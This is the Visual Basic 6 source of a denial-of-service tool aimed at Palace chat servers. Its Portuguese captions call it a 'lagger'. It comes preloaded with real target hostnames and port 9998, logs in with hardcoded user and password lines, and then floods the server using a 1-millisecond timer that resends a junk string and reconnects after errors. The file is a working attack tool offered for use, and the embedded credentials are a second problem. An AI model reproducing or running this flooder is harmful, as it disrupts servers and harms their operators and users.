VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00EFD1AD&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "The Palace S3RV3R DoS"
   ClientHeight    =   3840
   ClientLeft      =   675
   ClientTop       =   960
   ClientWidth     =   7830
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   3840
   ScaleWidth      =   7830
   Begin VB.Timer Timer3 
      Interval        =   5000
      Left            =   2250
      Top             =   1185
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   1290
      Top             =   2700
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command2 
      Caption         =   "CLEAR LOG"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   270
      Left            =   600
      TabIndex        =   13
      Top             =   1155
      Width           =   1125
   End
   Begin VB.ComboBox txthost 
      BackColor       =   &H00D89970&
      ForeColor       =   &H00400000&
      Height          =   315
      Left            =   1800
      TabIndex        =   10
      Text            =   "jardins.fastpalaces.com"
      Top             =   83
      Width           =   2340
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00D89970&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00400000&
      Height          =   330
      Left            =   60
      Locked          =   -1  'True
      TabIndex        =   8
      Top             =   795
      Width           =   7680
   End
   Begin VB.ListBox log 
      BackColor       =   &H00D89970&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FFFF&
      Height          =   2310
      ItemData        =   "Form1.frx":030A
      Left            =   60
      List            =   "Form1.frx":030C
      TabIndex        =   7
      Top             =   1455
      Width           =   7680
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Stop DoS!"
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   6
         Charset         =   255
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   6473
      TabIndex        =   6
      Top             =   435
      Width           =   1320
   End
   Begin VB.CommandButton Command3 
      Caption         =   "DoS!"
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   6
         Charset         =   255
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   225
      Left            =   5303
      TabIndex        =   5
      Top             =   435
      Width           =   1125
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   443
      Top             =   90
   End
   Begin VB.PictureBox Picture2 
      Height          =   330
      Left            =   6473
      ScaleHeight     =   270
      ScaleWidth      =   1260
      TabIndex        =   3
      Top             =   75
      Width           =   1320
      Begin VB.CommandButton Command1 
         Caption         =   "CONNECT"
         Default         =   -1  'True
         BeginProperty Font 
            Name            =   "Terminal"
            Size            =   6
            Charset         =   255
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   270
         Left            =   0
         TabIndex        =   4
         Top             =   0
         Width           =   1260
      End
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   2500
      Left            =   4755
      Top             =   615
   End
   Begin VB.TextBox txtPort 
      BackColor       =   &H00D89970&
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00400000&
      Height          =   330
      Left            =   5303
      TabIndex        =   2
      Text            =   "9998"
      Top             =   75
      Width           =   1125
   End
   Begin MSWinsockLib.Winsock w1 
      Left            =   4815
      Top             =   735
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label5 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "LOG:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   240
      Left            =   105
      TabIndex        =   12
      Top             =   1185
      Width           =   435
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Status:"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   240
      Left            =   105
      TabIndex        =   11
      Top             =   555
      Width           =   720
   End
   Begin VB.Label Label3 
      AutoSize        =   -1  'True
      BackColor       =   &H00D89970&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Lagando aguarde..."
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00400000&
      Height          =   315
      Left            =   1800
      TabIndex        =   9
      Top             =   435
      Visible         =   0   'False
      Width           =   2340
   End
   Begin VB.Label Label2 
      Alignment       =   1  'Right Justify
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Port:"
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   12
         Charset         =   255
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   240
      Left            =   4380
      TabIndex        =   1
      Top             =   120
      Width           =   900
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "HostName:"
      BeginProperty Font 
         Name            =   "Terminal"
         Size            =   12
         Charset         =   255
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   240
      Left            =   210
      TabIndex        =   0
      Top             =   120
      Width           =   1620
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim OP As Integer
Dim TSTR As String
Dim VRSTR As String
Dim porta As Long, lde As Long, late As Long
Private Sub Command1_Click()
On Error GoTo err
 
If w1.State = 0 Then
w1.RemoteHost = txthost.Text
w1.RemotePort = txtPort.Text
w1.Connect txthost.Text, txtPort.Text
Else
log.AddItem Time & " Não é possível realizar a operação neste momento..."
Text2.Text = Time & " Não é possível realizar a operação neste momento..."
End If
err:
If err.Number <> 0 And err.Number <> 13 Then
log.AddItem err.Number & Time & "Erro: " & err.Description
Text2.Text = err.Number & Time & "Erro: " & err.Description
End If
log.ListIndex = log.ListCount - 1
End Sub




Private Sub Command2_Click()
If log.ListCount > 1 Then log.Clear
End Sub

Private Sub Command3_Click()
Timer2.Enabled = True
Label3.Visible = True
Me.Caption = "Lagador de Servidores de Palace - Lagando: " & txthost.Text
End Sub

Private Sub Command4_Click()
Timer2.Enabled = False
Label3.Visible = False
Me.Caption = "Lagador de Servidores de Palace"
End Sub



Private Sub Command5_Click()
    lde = 1
    late = 65365
    If lde = 0 Then lde = 1
    If late = 0 Then late = 65365
    porta = lde
    Timer3.Enabled = True
End Sub

Private Sub Form_Load()
txthost.AddItem "jardins.fastpalaces.com"
txthost.AddItem "welcome.thepalace.com"
txthost.AddItem "fantasia.fastpalaces.com"
txthost.AddItem "ilhadamagia.fastpalaces.com"
VRSTR = "ryit" & vbCrLf
End Sub

Private Sub Text2_Change()
Text2.SelStart = Len(Text2.Text)
End Sub

Private Sub Timer1_Timer()
Select Case w1.State
Case Is = 0
log.AddItem Time & " >> SOCKET Fechado"
Text2.Text = Time & " >> SOCKET Fechado"
Case Is = 1
log.AddItem Time & " >> SOCKET Aberto"
Text2.Text = Time & " >> SOCKET Aberto"
Case Is = 2
log.AddItem Time & " >> SOCKET Aguardando Conexão de Cliente..."
Text2.Text = Time & " >> SOCKET Aguardando Conexão de Cliente..."
Case Is = 3
log.AddItem Time & " >> Conexão pendente..."
Text2.Text = Time & " >> Conexão pendente..."
Case Is = 4
log.AddItem Time & " >> Resolvendo host..."
Text2.Text = Time & " >> Resolvendo host..."
Case Is = 5
log.AddItem Time & " >> Host Resolvido"
Text2.Text = Time & " >> Host Resolvido"
Case Is = 6
log.AddItem Time & " >> SOCKET Conectando..."
Text2.Text = Time & " >> SOCKET Conectando..."
Case Is = 8
log.AddItem Time & " >> Ponto fechando conexão..."
Text2.Text = Time & " >> Ponto fechando conexão..."
Case Is = 9
log.AddItem Time & " >> Erro de SOCKET"
Text2.Text = Time & " >> Erro de SOCKET"
  '0  ->  Closed
  '1  ->  Open
  '2  ->  Listening
  '3  ->  Connection pending
  '4  ->  Resolving host
  '5  ->  Host resolved
  '6  ->  Connecting
  '7  ->  Connected
  '8  ->  Peer is closing the connection
  '9  ->  Error
  End Select
  log.ListIndex = log.ListCount - 1
End Sub

Private Sub Timer2_Timer()
On Error GoTo err

w1.SendData VRSTR & vbCrLf
If Len(Text2.Text) - Text2.MaxLength Then Text2.Text = Empty
err:
If err.Number = 40006 Then Command1_Click
'err.Clear
log.ListIndex = log.ListCount - 1
End Sub

Private Sub Timer3_Timer()
Command2_Click
End Sub

Private Sub w1_Close()
 
log.AddItem "<DESCONECTADO> às " & Time
Text2.Text = "<DESCONECTADO> às " & Time
log.ListIndex = log.ListCount - 1
End Sub

Private Sub w1_Connect()
Dim user As String
Dim pass As String
 
user = "> USER megaaccesshp"
pass = "> PASS 131733"
Command1.Enabled = False
log.AddItem "<CONECTADO> às " & Time
Text2.Text = "<CONECTADO> às " & Time
w1.SendData user
w1.SendData pass
log.ListIndex = log.ListCount - 1
End Sub

Private Sub w1_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
 
Dim str As String
w1.GetData str
log.AddItem str
Dim var As Variant
w1.GetData var
log.AddItem var
Dim lng As Long
w1.GetData lng
log.AddItem lng
Dim inte As Integer
w1.GetData inte
log.AddItem inte


log.AddItem "Bytes Totais Recebidos: " & bytesTotal & " às " & Time
log.ListIndex = log.ListCount - 1
End Sub

Private Sub w1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
log.AddItem "Erro: " & Description & " Nº: " & Number
w1.Close
log.AddItem "<Socket Fechado> às " & Time
Text2.Text = "<Socket Fechado> às " & Time
Command1.Enabled = True
log.ListIndex = log.ListCount - 1

End Sub

Private Sub w1_SendComplete()
log.AddItem "Envio de dados para lag concluído! " & Time
Text2.Text = "Envio de dados para lag concluído! " & Time
log.ListIndex = log.ListCount - 1
End Sub

Private Sub Winsock1_Connect()
Dim pot As String
pot = vbCrLf & porta
      Winsock1.Close
End Sub

